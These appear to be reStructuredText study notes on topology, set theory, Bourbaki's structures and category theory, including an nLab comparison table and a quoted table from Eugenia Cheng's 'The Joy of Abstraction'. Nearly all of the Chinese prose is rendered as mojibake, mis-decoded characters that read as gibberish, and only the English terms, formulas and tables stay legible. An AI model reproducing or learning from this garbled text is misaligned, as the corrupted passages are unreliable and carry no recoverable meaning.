      ÁöÑÂú∞Êñπ‚Äî‚ÄîËøôÊòØ‰ª£Êï∞ÁöÑÂ®ÅÂäõÊâÄÂú®ÔºåÊàë‰ª¨‰∏çÂÜçÈúÄË¶Å‰∏∫ÊØè‰∏Ä‰∏™ÂÖ∑‰ΩìÈ¢ÜÂüüÈáçÊñ∞Âª∫Á´ãËøô‰πàÂ§öÁöÑÂÆöÁêÜ„ÄÇ

   ÊãìÊâëÂ≠¶ÊòØÁ†îÁ©∂ÊãìÊâëÁ©∫Èó¥ÔºàTopological spaceÔºâÁöÑÊï∞Â≠¶ÂàÜÊîØÔºåÂç≥Á†îÁ©∂Âá†‰ΩïÂõæÂΩ¢ÂèòÂåñÁöÑÂ≠¶ÈóÆ„ÄÇÂÆÉÊúâ‰∏Ä‰∏™
   Êõ¥ÂΩ¢Ë±°ÁöÑÂêçÁß∞ÊòØ‚ÄúÊ©°ÁöÆÂá†‰ΩïÂ≠¶‚ÄùÔºåÂÅáËÆæÂ∞Ü‰∏âËßíÂΩ¢ÁöÑÊ©°ÁöÆÊçèÊàêÊ≠£ÊñπÂΩ¢Ôºå‰ªÄ‰πàÂèòÂåñ‰∫ÜÔºü‰ªÄ‰πàÊ≤°ÂèòÂë¢ÔºüÊ¨ßÊ∞èÂá†‰Ωï‰∏≠
   Êúâ‰∏ÄÊù°ÂÆöÁêÜÔºàEuler's FormulaÔºâÔºö‰∏Ä‰∏™Â§öÈù¢‰ΩìÔºàpolyhedronÔºâÈ°∂ÁÇπ‰∏éËæπÊï∞„ÄÅÈù¢Êï∞ÁöÑÂ∑ÆÊÅí‰∏∫ 2
   Ôºàvertices - edges + faces = 2ÔºâÔºåÂÖ¨ÂºèË°®Á§∫Ôºö

      ùíó - ùëí + ùëì = 2

   1872 Âπ¥ Klein ‰∫éÁà±Â∞îÂÖ∞Ê†πÁ∫≤È¢ÜÔºàErlanger ProgrammeÔºâ‰∏≠ÊâÄËø∞ÔºöÂá†‰ΩïÊòØÁ†îÁ©∂Âú®ÊüêÁßçËøêÂä®Áæ§‰∏ã‰∏çÂèòÁöÑÊÄßË¥®„ÄÇ

   Âπø‰πâÊãìÊâëÂ≠¶ÊòØÊé¢Ê±ÇÂêåÁ±ª‰∫ãÁâ©ÁöÑÂÖ±ÊÄßÊâÄÂú®ÁöÑÂ≠¶ÈóÆÔºåÂç≥‰∏ÄÁßçÂÆèËßÇÁöÑÂΩíÁ∫≥Êé®ÁêÜÔºàinductive reasoningÔºâ„ÄÇ
   ÊãìÊâëÂ≠¶Â∞ÜÊï∞Â≠¶ÂàÜÊûê‰ªé‰∏ÄÁª¥ÁöÑÂÆûÊï∞ËΩ¥Êé®ÂπøÂà∞‰∏ÄËà¨Á©∫Èó¥ÔºåËøô‰πüÊòØÁé∞‰ª£ÂàÜÊûêÁöÑÊäΩË±°Âü∫Á°Ä„ÄÇ

   ÊãìÊâëÂ≠¶ÊääÊûÅÈôêÁöÑÊ¶ÇÂøµÊé®ÂπøÂà∞‰∏ÄËà¨ÁöÑÊãìÊâëÁ©∫Èó¥ÔºåÂπ∂ÂºïÂÖ•ÂæÆÂàÜÁªìÊûÑÔºåÂú®ÊµÅÂΩ¢‰∏äÁöÑÂàÜÊûê‰πã‰∏äÂèëÂ±ïÂá∫ÂæÆÂàÜÂá†‰Ωï„ÄÇ
   Âú®ÂæÆÁßØÂàÜÈáåÈù¢ÔºåÊûÅÈôê‰πãÂêéÊàë‰ª¨ÊúâÂæÆÂàÜ„ÄÅÊ±ÇÂØº„ÄÅÁßØÂàÜ„ÄÇËøô‰∫õ‰∏úË•ø‰πüÂèØ‰ª•Êé®ÂπøÂà∞ÊãìÊâëÁ©∫Èó¥ÔºåÂú®ÊãìÊâëÂ≠¶ÁöÑÂü∫Á°Ä‰∏ä
   Âª∫Á´ãËµ∑ÂæÆÂàÜÂá†‰Ωï„ÄÇ‰ªéÊïôÂ≠¶‰∏äËØ¥ÔºåÂæÆÂàÜÂá†‰ΩïÁöÑÊïôÊùêÔºåÊúâ‰∏§Áßç‰∏çÂêåÁöÑÁ±ªÂûãÔºå‰∏ÄÁßçÊòØÂª∫Á´ãÂú®Âè§ÂÖ∏ÂæÆÊú∫ÂàÜÁöÑÂü∫Á°Ä‰∏ä
   ÁöÑ‚ÄúÂè§ÂÖ∏ÂæÆÂàÜÂá†‰Ωï‚ÄùÔºå‰∏ªË¶ÅÊòØÂÖ≥‰∫é‰∫åÁª¥Âíå‰∏âÁª¥Á©∫Èó¥‰∏≠ÁöÑ‰∏Ä‰∫õÂá†‰ΩïÈáèÁöÑËÆ°ÁÆóÔºåÊØîÂ¶ÇÊõ≤Áéá„ÄÇËøòÊúâ‰∏ÄÁßçÊòØÂª∫Á´ãÂú®
   Áé∞‰ª£ÊãìÊâëÂ≠¶ÁöÑÂü∫Á°Ä‰∏äÔºåËøôÈáåÂßë‰∏îÁß∞‰∏∫‚ÄúÁé∞‰ª£ÂæÆÂàÜÂá†‰Ωï‚ÄùÔºàÊ†∏ÂøÉÊ¶ÇÂøµÊòØ‚ÄúÊµÅÂΩ¢‚ÄùÔºâÔºåÂú®ÊãìÊâëÁ©∫Èó¥ÁöÑÂü∫Á°Ä‰∏äÂä†‰∫Ü
   ‰∏ÄÂ•óÂèØ‰ª•ËøõË°åÂæÆÂàÜËøêÁÆóÁöÑÁªìÊûÑ„ÄÇÈô§‰∫ÜÊé®ÂπøÂæÆÁßØÂàÜÁöÑÊ¶ÇÂøµ‰ª•Â§ñÔºåËøòÂºïÂÖ•‰∫ÜÂæàÂ§öÊñ∞Ê¶ÇÂøµÔºötangent space, 
   cotangent space, push forward, pull back, fibre bundle, flow, immersion, 
   submersion Á≠âÁ≠â„ÄÇ

   Ëøë‰∫õÂπ¥ÔºåÊµÅÂΩ¢Âú® machine learning ‰ºº‰πéÁõ∏ÂΩìÊó∂È´¶„ÄÇ‰ΩÜÊòØÔºåÂù¶ÁéáÂú∞ËØ¥ÔºåË¶ÅÂºÑÊáÇ‰∏Ä‰∫õÂü∫Êú¨ÁöÑÊµÅÂΩ¢ÁÆóÊ≥ïÔºå
   ÁîöËá≥‚ÄúÂàõÈÄ†‚Äù‰∏Ä‰∫õÊµÅÂΩ¢ÁÆóÊ≥ïÔºåÂπ∂‰∏çÈúÄË¶ÅÂ§öÂ∞ëÂæÆÂàÜÂá†‰ΩïÁöÑÂü∫Á°Ä„ÄÇÂØπÊàëÁöÑÁ†îÁ©∂Êù•ËØ¥ÔºåÂæÆÂàÜÂá†‰ΩïÊúÄÈáçË¶ÅÁöÑÂ∫îÁî®Â∞±ÊòØ
   Âª∫Á´ãÂú®ÂÆÉ‰πã‰∏äÁöÑÂè¶Â§ñ‰∏Ä‰∏™ÂàÜÊîØÔºöÊùéÁæ§„ÄÅÊùé‰ª£Êï∞‚Äî‚ÄîËøôÊòØÊï∞Â≠¶‰∏≠‰∏§Â§ßÂÆ∂ÊóèÂàÜÊûêÂíå‰ª£Êï∞ÁöÑ‰∏Ä‰∏™ÊºÇ‰∫ÆÁöÑËÅîÂßª„ÄÇÂàÜÊûêÂíå
   ‰ª£Êï∞ÁöÑÂè¶Â§ñ‰∏ÄÂ§ÑÈáçË¶ÅÁöÑÁªìÂêàÂàôÊòØÊ≥õÂáΩÂàÜÊûêÔºå‰ª•ÂèäÂú®ÂÖ∂Âü∫Á°Ä‰∏äÁöÑË∞ÉÂíåÂàÜÊûê„ÄÇ


   Áé∞‰ª£Êï∞Â≠¶ÁöÑÂü∫Á°ÄÊòØÈõÜÂêàËÆ∫ÔºåÁ†îÁ©∂ÂØπË±°Â∞±‰∏çÂÜçÊòØÊï∞ÂíåÂΩ¢Ëøô‰∏§Â§ß‰º†Áªü„ÄÅÁªèÂÖ∏ÁöÑÁ†îÁ©∂È¢ÜÂüüÔºåËÄåÊòØÁ©∫Èó¥ÔºàspacesÔºâ
   ÂíåÊµÅÂΩ¢ÔºàmanifoldÔºâ„ÄÇ‚ÄúÊµÅÂΩ¢‚ÄùÔºåÊòØÂØπ‚ÄúÂ§öÈáç„ÄÅÂ§öÊ†∑„ÄÅÁπÅÂ§ç‚ÄùËøô‰∏™ÊÑè‰πâÁöÑÂèòÁõ∏Áõ¥ËØë„ÄÇÂÆÉ‰ª¨ÈÉΩËÉΩÁî®ÈõÜÂêàÂíåÊò†Â∞ÑÁöÑ
   Ê¶ÇÂøµÁªü‰∏ÄËµ∑Êù•ÔºåÂ∑≤ÂæàÈöæÂå∫ÂàÜÂì™‰∫õÂ±û‰∫éÊï∞ÁöÑËåÉÁï¥ÔºåÂì™‰∫õÂ±û‰∫éÂΩ¢ÁöÑËåÉÁï¥„ÄÇ

   Áé∞‰ª£Êï∞Â≠¶Âª∫Á´ãÂú®ÈõÜÂêàËÆ∫Ëøô‰∏™ÂÖ±ÂêåÁöÑÂü∫Á°Ä‰∏äÔºåÈõÜÂêàËÆ∫‰∏≠Êúâ‰∏Ä‰∫õÂü∫Êú¨ÁöÑÊ¶ÇÂøµÔºåÂ¶ÇÂâçÈù¢‰ªãÁªçËøáÁöÑÈõÜÂêàÔºåËøòÊúâ
   ÂÖ≥Á≥ª„ÄÅÂáΩÊï∞„ÄÅÁ≠â‰ª∑Á≠âÔºå‰Ωú‰∏∫Êï∞Â≠¶ÂêÑ‰∏™ÂàÜÊîØÁöÑÂÖ±ÂêåËØ≠Ë®Ä„ÄÇÂêåÊó∂ÂèàÂõ†‰∏çÂêåÂàÜÊîØÁöÑÈúÄË¶ÅÂºïÂÖ•‰∫ÜËÆ∏Â§öÊï∞Â≠¶ÁªìÊûÑ
   ÔºàMathematical Structures/ObjectsÔºâÔºåÂ∏∏ËßÅÁöÑÁªìÊûÑÊúâÔºöÂ∫èÔºàOrderÔºâ„ÄÅ‰ª£Êï∞ÁªìÊûÑ„ÄÅ
   ÊãìÊâëÔºàTopologyÔºâ„ÄÅÊ®°ÔºàmoduleÔºâ„ÄÅÊ†ºÔºàLatticeÔºâ„ÄÅÊµãÂ∫¶ÔºàMeasureÔºâ„ÄÅÂ∫¶ÈáèÔºàMetricÔºâ/Âá†‰Ωï„ÄÅ
   Á≠â‰ª∑ÂÖ≥Á≥ª„ÄÅËåÉÁï¥ÔºàCategoryÔºâ„ÄÅÂæÆÂàÜÁªìÊûÑÁ≠â„ÄÇ

   ‰∏ä‰∏ñÁ∫™‰∏≠ÊúüÁõõÊûÅ‰∏ÄÊó∂ÁöÑÊ≥ïÂõΩÂ∏ÉÂ∞îÂ∑¥Âü∫Â≠¶Ê¥æÔºàÁªìÊûÑ‰∏ª‰πâÔºâÊõæÊèêÂá∫Êï∞Â≠¶ÁöÑ‰∏âÁßçÂü∫Êú¨ÁªìÊûÑÔºö

      1. ‰ª£Êï∞ÁªìÊûÑÔºöÁî±ÈõÜÂêàÂèäÂÖ∂‰∏äÁöÑËøêÁÆóÁªÑÊàêÔºåÂ¶ÇÁæ§„ÄÅÁéØ„ÄÅÂüü„ÄÅÊ®°„ÄÅÁ∫øÊÄßÁ©∫Èó¥Á≠â„ÄÇ
      2. Â∫èÁªìÊûÑÔºöÁî±ÈõÜÂêàÂèäÂÖ∂‰∏äÁöÑÂ∫èÂÖ≥Á≥ªÁªÑÊàêÔºåÂ¶ÇÂÅèÂ∫èÈõÜ„ÄÅÂÖ®Â∫èÈõÜ„ÄÅËâØÂ∫èÈõÜ„ÄÇ
      3. ÊãìÊâëÁªìÊûÑÔºöÁî±ÈõÜÂêàÂèäÂÖ∂‰∏äÁöÑÊãìÊâëÁªÑÊàêÔºåÂ¶ÇÊãìÊâëÁ©∫Èó¥„ÄÅÂ∫¶ÈáèÁ©∫Èó¥„ÄÅÊµÅÂΩ¢„ÄÅÁ¥ßËá¥ÈõÜÁ≠â„ÄÇ

   The Bourbaki school Â∞Ü mathematical structures ÂàÜ‰∏∫‰∏âÁ±ªÔºöOrder structuresÔºå
   Algebraic structuresÔºåTopological structuresÔºå‰ªñ‰ª¨ÈÉΩÂü∫‰∫é set theoryÔºåÊõ¥È´òÈò∂ÁöÑ
   Êï∞Â≠¶ÁªìÊûÑÂü∫Êú¨‰∏äÂèØ‰ª•ÂΩí‰∏∫Ëøô‰∏âÁßçÂü∫Êú¨Á±ªÂûãÁöÑÁªÑÂêà„ÄÇ

   ‰ΩøÁî®Âêå‰∏ÄÂ•óËØ≠Ë®ÄÔºàÈõÜÂêàËÆ∫ÔºâÁöÑÁé∞‰ª£‰ª£Êï∞Â≠¶ÁöÑÂº∫Â§ßÊâÄÂú®ÔºöÂè™Ë¶ÅËØÅÊòé‰∫Ü‰∏Ä‰∏™ÂÖ≥‰∫éÊüê‰∏™‰ª£Êï∞ÁªìÊûÑÁöÑ‰∏ÄËà¨ÁöÑ‰∫ãÂÆûÔºå
   Â∞±ÂÜç‰πüÊ≤°ÊúâÂøÖË¶ÅÂú®ÊØè‰∏ÄÊ¨°‰∏éËøô‰∏™ÁªìÊûÑÁöÑÁâπ‰æãÁõ∏ÈÅáÊó∂ÂÄôÔºåÂÜçÂéªÂàÜÂà´ÊåáÊòé‰∏ÄÊ¨°Ëøô‰∏™‰∫ãÂÆû„ÄÇËøô‰∏™ÊäΩË±°ÁöÑÈÄîÂæÑ‰ΩøÂæó
   Êàë‰ª¨ËÉΩÂú®ÁúãÊù•ÂÆåÂÖ®‰∏çÁõ∏ÂêåÁöÑËÉåÊôØ‰∏ãÔºåÁúãÂá∫ÂæàÈáçË¶ÅÁöÑÁõ∏‰ºº‰πãÂ§Ñ„ÄÇ

   ÈõÜÂêàËÆ∫‰∏≠ÊúÄÂü∫Êú¨ÁöÑÊ¶ÇÂøµÔºöÈõÜÂêàÔºàsetÔºâÔºåÂÖ≥Á≥ªÔºàrelationÔºâÔºåÂáΩÊï∞ÔºàfunctionÔºâÔºåÁ≠â‰ª∑ÔºàequivalenceÔºâ
   Âú®ÂÖ∂‰ªñÊï∞Â≠¶ÂàÜÊîØÁöÑËØ≠Ë®Ä‰∏≠Âá†‰πéÂøÖÁÑ∂Â≠òÂú®ÁöÑ„ÄÇ

   ‰ªéÂàùÁ≠â‰ª£Êï∞ËØ≠Ë®ÄÂàáÊç¢Âà∞Âü∫‰∫éÈõÜÂêàÁöÑÊäΩË±°‰ª£Êï∞ËØ≠Ë®ÄÔºåÂü∫Êú¨Ê¶ÇÂøµË¢´Ëøõ‰∏ÄÊ≠•Ê≥õÂåñÔºàGenerization of relationÔºâ
   ‰∏∫Á≠â‰ª∑ÂÖ≥Á≥ªÔºåËøô‰∏™Ê≥õÂåñËøáÁ®ãÂèëÁîüÂú®Êï¥‰∏™Êï∞Â≠¶ÂéÜÂè≤ËøõÁ®ã‰∏≠„ÄÇ‰∏çÂêåÁöÑËÆ∞Âè∑ÔºànotationÔºâÊÑèÂë≥ÁùÄ‰∏çÂêåÁöÑÊÄùÁª¥ÊñπÂºè„ÄÅ
   ÊäΩË±°Â±ÇÊ¨°ÔºåÂèØ‰ª•Ë°®Á§∫‰∏∫‰ª•‰∏ãËøô‰∏™Êï∞ÂÄºÂ§ßÂ∞èÊØîËæÉÁöÑÂÖ∑‰Ωì‰æãÂ≠êÊù•ËØ¥ÊòéÔºö‰ªéÂÖ∑‰ΩìÂê´‰πâÁöÑÊï∞Â≠óÊäΩË±°‰∏∫‰ΩøÁî®‰ª£Êï∞Á¨¶Âè∑
   Ë°®Á§∫ÂÖ∑‰ΩìÁöÑÊï∞Â≠óÔºåÂÜç‰ªéÂÖ∑‰ΩìÁöÑ > Â§ß‰∫éÊØîËæÉÁ¨¶Âè∑ÊäΩË±°‰∏∫‰∏Ä‰∏™ÂèØ‰ª•Ë°®Á§∫‰ªªÊÑè‰∫åÂÖÉËøêÁÆóÂÖ≥Á≥ªÁöÑÁ¨¶Âè∑Ôºà‚´êÔºâÔºö
   ::

       2 > 1  ==>  a > b  ==>  a ‚´ê b 
      ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ     ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ     ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ 
         ‚îÇ           ‚îÇ           ‚îÇ    
         ‚îÇ           ‚îÇ           ‚îî‚îÄStage 3: ËøêÁÆóÁ¨¶Âè∑ÊäΩË±°Ë°®ËææÔºàbinary operationÔºâ
         ‚îÇ           ‚îî‚îÄStage 2: ‰ª£Êï∞ÔºàAlgebraicÔºâ
         ‚îî‚îÄStage 1: ÁÆóÊúØÔºàarithmeticÔºâ

   Á≠â‰ª∑ÂÖ≥Á≥ªÊª°Ë∂≥ÔºöÔºà1ÔºâËá™ÂèçÊÄßÔºàreflexivityÔºâÔºåÔºà2ÔºâÂØπÁß∞ÊÄßÔºàsymmetryÔºâÔºà3Ôºâ‰º†ÈÄíÊÄßÔºàtransitivityÔºâ„ÄÇ

   Áõ∏ÂÖ≥‰ª£Êï∞ÁªìÊûÑÂèäÂÖ∂Ê≥õÂåñÂØπË±°ÁöÑÂØπÁÖßÂ¶Ç‰∏ãÔºö

      *  ÂàùÁ≠â‰ª£Êï∞‰∏≠ÁöÑÊï∞Âª∂‰º∏‰∏∫ÈõÜÂêàÔºåÂç≥‰ªé‰∏ªË¶ÅÁ†îÁ©∂ÂØπË±°Áî±Êï∞ËøôÁßçÂàùÂßãÁöÑÊï∞Â≠¶ÁªìÊûÑËΩ¨Âèò‰∏∫ÈõÜÂêàÁªìÊûÑ„ÄÇ
      *  Âä†Âáè‰πòÈô§ËøêÁÆóÊäΩË±°‰∏∫‰∫åÂÖÉËøêÁÆó * (binary operation)Ôºå‰∏éÈõÜÂêà‰∏ÄËµ∑ÊûÑÊàêÁæ§ÔºàGroupÔºâ‰ª£Êï∞ÁªìÊûÑ„ÄÇ
      *  Áæ§‰ª£Êï∞‰∏≠Â∞ÜÊï∞Â≠ó 0 Âíå 1 ÊäΩË±°‰∏∫Âçï‰ΩçÂÖÉÔºàidentity elementsÔºâÔºåÂàÜÂà´‰∏∫Âä†Ê≥ï„ÄÅÂâ©Ê≥ïÂçï‰ΩçÂÖÉ„ÄÇ
      *  Ë¥üÊï∞ÊäΩË±°‰∏∫ÈÄÜÂÖÉÁ¥†Ôºàinverse elementÔºâÔºåÂä†Ê≥ï„ÄÅ‰πòÊ≥ï‰∏≠Ôºåa ÁöÑÈÄÜÂÖÉÁ¥†ÂàÜÂà´ÊòØ -a ÂíåÂÖ∂ÂÄíÊï∞ a‚Åª¬π„ÄÇ
      *  ÂºÄÈõÜ„ÄÅÈó≠ÈõÜ(Open/Closed Set) ÂØπÂ∫î‰ª£Êï∞‰∏≠ÁöÑÂºÄÂå∫Èó¥„ÄÅÈó≠Âå∫Èó¥Ôºàopen/closed intervalÔºâ„ÄÇ
      *  ÊúÄÂ∞èÁöÑËåÉÁï¥ÔºàÊã•Êúâ 0 ‰∏™ÂØπË±°ÁöÑËåÉÁï¥ÔºâÂØπÂ∫îÁ©∫ÈõÜÂêà ‚àÖ„ÄÇÊúÄÂ∞èËåÉÁï¥Ê≤°ÊúâÂØπË±°ÔºåËá™ÁÑ∂‰πüÂ∞±Ê≤°ÊúâÊÄÅÂ∞Ñ„ÄÇ

      ===========================   ========================================
      Set theory                    Category theory
      ===========================   ========================================
      membership relation           -
      sets                          categories
      elements                      objects
      -                             morphisms
      functions                     functors
      equations between elements    isomorphisms between objects
      equations between sets        equivalences between categories
      equations between functions   natural transformations between functors
      ===========================   ========================================

   Êï∞ÊçÆË°®Êù•Ëá™ `nLab - category theory <https://ncatlab.org/nlab/show/category+theory>`__

   Âú®ÊäΩË±°‰ª£Êï∞‰∏≠ÔºåÂêåÊûÑÔºàisomorphismÔºâÊåáÁöÑÊòØ‰∏Ä‰∏™‰øùÊåÅÁªìÊûÑÁöÑÂèåÂ∞ÑÔºàÊó¢ÊòØÂçïÂ∞ÑÂèàÊòØÊª°Â∞ÑÔºâ„ÄÇÂú®Êõ¥‰∏ÄËà¨ÁöÑ
   ËåÉÁï¥ËÆ∫ËØ≠Ë®Ä‰∏≠ÔºåÂêåÊûÑÊòØÊåáÔºö‰∏Ä‰∏™ÊÄÅÂ∞ÑÔºå‰∏îÂ≠òÂú®Âè¶‰∏Ä‰∏™ÊÄÅÂ∞ÑÔºå‰ΩøÂæó‰∏§ËÄÖÁöÑÂ§çÂêàÊòØ‰∏Ä‰∏™ÊÅíÁ≠âÊÄÅÂ∞Ñ„ÄÇ‰πüÂ∞±ÊòØÂ≠òÂú®
   ÂØπÂ∫îÁöÑÈÄÜÂÖÉÔºàinverse elementÔºâÔºåËøô‰ΩìÁé∞‰∫ÜÁ≠â‰ª∑ÂÖ≥Á≥ªÁöÑÂØπÁß∞ÊÄßÔºàsymmetryÔºâÔºå‰ΩøÁî® ‚âà Á¨¶Âè∑Ë°®Á§∫„ÄÇ

   Á∫ØÊï∞Â≠¶ÂÆ∂Á†îÁ©∂ÁöÑÊòØ‰∏çÂêåÁöÑÊäΩË±°ÁªìÊûÑÔºå‰ΩÜÂ¶ÇÊûúÊää‰∏çÂêåÁöÑÊï∞Â≠¶ÁªìÊûÑÔºåÂ¶ÇÁæ§ÔºàGroupÔºâ„ÄÅÂÅèÂ∫èÔºàPartialÔºâ„ÄÅ
   ÊãìÊâëÁ©∫Èó¥Á≠âÔºåËøõË°åËøõ‰∏ÄÊ≠•ÁöÑÊäΩË±°ÔºåÁ†îÁ©∂ÁªìÊûÑ‰πã‰∏äÁöÑÁªìÊûÑÔºåËøôÂ∞±ÊòØËåÉÁï¥ÔºàCategory theoryÔºâ„ÄÇ
   Ëã•ÂÜçÂ∫¶ÊäΩË±°ÔºåÂ∞±ÂæóÂà∞‰∫ÜÂáΩÂ≠êÔºàfunctorÔºâÔºåÂÜçÂæÄ‰∏äÂ∞±ÊòØËá™ÁÑ∂ÂèòÊç¢Ôºànatural transformationÔºâ„ÄÇ
   ËåÉÁï¥ËÆ∫ËøòÂèØ‰ª•ÁªßÁª≠Á†îÁ©∂ÊäΩË±°ÁöÑÊäΩË±°ÔºåÁõ¥Ëá≥Êó†Á©∑„ÄÇ

   The Joy of Abstraction - An Exploration of Math, Category Theory, and Life
   by Eugenia Cheng

   „ÄäÊäΩË±°‰πêË∂£„Äã‰∏Ä‰π¶ÊòØÈùûÂ∏∏Â•ΩÁöÑ‰∏ÄÊú¨ËåÉÁï¥ËÆ∫ÂÖ•Èó®‰π¶ÔºåÂÆÉ‰ªéÂÖ∑Ë±°Âá∫ÂèëÔºåÊºîÁªéÂá∫ËåÉÁï¥ËÆ∫ÊâÄÊ∂âÂèäÁöÑÂêÑ‰∏™ÊäΩË±°Ê¶ÇÂøµ„ÄÇ
   ‰ª•‰∏ãÊòØÊ≠§Ê≠§‰π¶Êï¥ÁêÜÁöÑ‰∏ÄÂº†Á≠â‰ª∑ÂÖ≥Á≥ªË°®ÔºàEquivalence relationsÔºâÔºö
   ::

      9.2 Equivalence relations 

      Finally here‚Äôs a table summing up how we regard equivalence relations as
      categories. These are deep ideas and might be difficult at first. Note the 
      ‚Äúmis-match‚Äù between what counts as data, structure and properties on each side.

                  equivalence
                    relation                     category
      =========== =============  ============  =============  ==========
         DATA        objects       ------->       objects
      STRUCTURE     relations      ------->       arrows         DATA
      =========== =============  ============  =============  ==========
                   reflexivity     ------->     identities
      PROPERTIES    symmetry       ------->      inverses      STRUCTURE
                  transitivity     ------->     composition
      =========== =============  ============  =============  ==========
                                               unit laws
                                               associativity  PROPERTIES

   ËåÉÁï¥ËÆ∫ÊòØÈ´òÂ∫¶ÊäΩË±°ÁöÑÁêÜËÆ∫ÔºåËÑ±ËÉéËá™Áæ§ËÆ∫ÔºàGroup theoryÔºâ„ÄÅÊãìÊâëÂ≠¶ÔºàTopologyÔºâÁ≠âÊï∞Â≠¶ÂàÜÊîØÁöÑÁ†îÁ©∂ÈúÄË¶Å„ÄÇ
   ËåÉÁï¥ËÆ∫Ôºàcategory theoryÔºâÂèàË¢´Áß∞‰∏∫‰∏∫Êï∞Â≠¶‰∏≠ÁöÑÊï∞Â≠¶ÔºåÊäΩË±°‰∏≠ÁöÑÊäΩË±°„ÄÅÊäΩË±°Â∫üËØùÔºàabstract nonsenseÔºâ„ÄÇ

   È°ªÁü•ÈÅìËåÉÁï¥ËÆ∫ÂºïÂÖ•‰∫ÜÂ∞èËåÉÁï¥Ôºàsmall categoryÔºâÂíåÂ§ßËåÉÁï¥Ôºàlarge categoryÔºâ‰∏§‰∏™Ê¶ÇÂøµÔºåÂéüÂõ†ÊòØ‰∏çËÉΩ
   ÊûÑÈÄ†ÊâÄÊúâÈõÜÂêàÁöÑÈõÜÂêàÔºåÂõ†‰∏∫ÁΩóÁ¥†ÊÇñËÆ∫ÈóÆÈ¢òÔºåÈõÜÂêàËÆ∫ÈúÄË¶ÅÁ∫¶ÊùüËá™Âê´ÈõÜÂêàÁöÑÂÆö‰πâ„ÄÇÂ∞èËåÉÁï¥ÔºöÂØπË±°ÊòØ‰∏Ä‰∏™ÈõÜÂêàÁöÑËåÉÁï¥„ÄÇ
   Â¶ÇÊûú‰∏Ä‰∏™Â∞èËåÉÁï¥ÁöÑÂØπË±°ÁöÑÂêåÊûÑÊòØ‰∏Ä‰∏™ÈõÜÂêàÔºåÂàôÁß∞Âü∫Êú¨Â∞èÔºàessentially smallÔºâËåÉÁï¥ÔºåÊòæÁÑ∂Â∞èËåÉÁï¥ÊÄªÊòØÂü∫Êú¨Â∞èÁöÑ„ÄÇ

   ‰ª•‰∏ã‰ΩøÁî®Ëá™ÁÑ∂ËØ≠Ë®ÄÂÆö‰πâËåÉÁï¥ËÆ∫‰∏≠ÁöÑÂü∫Êú¨Ê¶ÇÂøµÔºö

   **ËåÉÁï¥ÔºàcategoryÔºâÊòØ‰∏ÄÁßçÂåÖÂê´ÂØπË±°ÂèäÂØπË±°‰πãÈó¥‰ΩøÁî®ÁÆ≠Â§¥ÂÖ≥ËÅîÁöÑ‰ª£Êï∞ÁªìÊûÑ„ÄÇ**

   **ÊÄÅÂ∞ÑÔºàmorphismÔºâÊòØÂú®Êï∞Â≠¶‰∏≠ÊòØÊåá‰∏§‰∏™Êï∞Â≠¶ÁªìÊûÑ‰πãÈó¥‰øùÊåÅÁªìÊûÑÁöÑ‰∏ÄÁßçÊò†Â∞Ñ„ÄÇ**

   **ÂáΩÂ≠êÔºàfunctorÔºâÊòØËåÉÁï¥Âà∞ËåÉÁï¥„ÄÅÊÄÅÂ∞ÑÂà∞ÊÄÅÂ∞Ñ„ÄÅÂØπË±°Âà∞ÂØπË±°ÁöÑÊò†Â∞ÑÔºåÂåÖÊã¨Âçï‰ΩçÊÄÅÂ∞Ñ‰∏éÂ§çÂêàÊÄÅÂ∞Ñ„ÄÇ**

   Â∫îËØ•ÊääÂáΩÂ≠êÁúã‰ΩúÊÄÅÂ∞ÑÁöÑÊò†Â∞Ñ‚Äî‚ÄîËøô‰∏™ËßÇÁÇπÂú® Haskell ÁöÑ ``fmap`` ÔºàFunctorÔºâÁ±ªÂûãÁöÑÂÆö‰πâ‰∏≠ÂæóÂà∞Âº∫Ë∞É„ÄÇ
   ÂΩìÁÑ∂ÔºåÂáΩÂ≠ê‰πüÊò†Â∞ÑÂØπË±°ÔºàÊÄÅÂ∞ÑÁöÑ‰∏§‰∏™Á´ØÁÇπÔºâÔºåÂê¶ÂàôÂ∞±Ê≤°Ê≥ïË∞àËÆ∫‰øùÊåÅÂ§çÂêà„ÄÇËåÉÁï¥‰∏≠ÁöÑÂØπË±°ËØ¥Êòé‰∫ÜÂì™‰∫õÊÄÅÂ∞ÑÂØπ
   ÂèØ‰ª•Â§çÂêàÔºàcompositionÔºâ„ÄÇÂÖ∂‰∏≠‰∏Ä‰∏™ÊÄÅÂ∞ÑÁöÑÁªàÁÇπÂøÖÈ°ªÁ≠â‰∫éÂè¶‰∏Ä‰∏™ÊÄÅÂ∞ÑÁöÑËµ∑ÁÇπ‚Äî‚ÄîÂ¶ÇÊûúÂÆÉ‰ª¨ËÉΩÂ§çÂêà„ÄÇÊâÄ‰ª•Â¶ÇÊûú
   Ë¶ÅÊääÊÄÅÂ∞ÑÁöÑÂ§çÂêàÊò†Â∞Ñ‰∏∫ÊèêÂçáÂêéÁöÑÊÄÅÂ∞ÑÁöÑÂ§çÂêàÔºåÂ∞±ÂæàÂ§ßÁ®ãÂ∫¶‰∏äË¢´ÂÜ≥ÂÆö‰∫ÜÁ´ØÁÇπÔºàÂØπË±°ÔºâÁöÑÊò†Â∞Ñ„ÄÇ

   ÊÄÅÂ∞ÑÔºàmorphismÔºâÊòØËåÉÁï¥‰∏≠ÁöÑ‰∏Ä‰∏™Âü∫Êú¨Ê¶ÇÂøµÔºåÂÆÉÊòØÈõÜÂêà‰∏äÁöÑÊò†Â∞ÑÁöÑÊé®Âπø„ÄÇËåÉÁï¥ËÆ∫‰∏≠‰ΩøÁî®ÂáΩÂ≠êÊù•ÊèèËø∞
   ÂêÑÁßçËåÉÁï¥Èó¥ÁöÑÂÖ≥Á≥ªÔºåÂç≥ÂáΩÂ≠êÔºàfunctorÔºâÊòØËåÉÁï¥Èó¥ÁöÑÊÄÅÂ∞ÑÔºöÂáΩÂ≠êÊòØÊèèËø∞‰∫Ü‰ªéÊüêËåÉÁï¥ C ÁöÑÂØπË±°Êò†Â∞ÑÂà∞
   ÊüêËåÉÁï¥ D ‰∏≠ÁöÑÂØπË±°ÔºåÊääËåÉÁï¥ C ‰∏≠ÁöÑÊÄÅÂ∞ÑÊò†Âà∞ËåÉÁï¥ D ‰∏≠ÁöÑÊÄÅÂ∞Ñ„ÄÇ

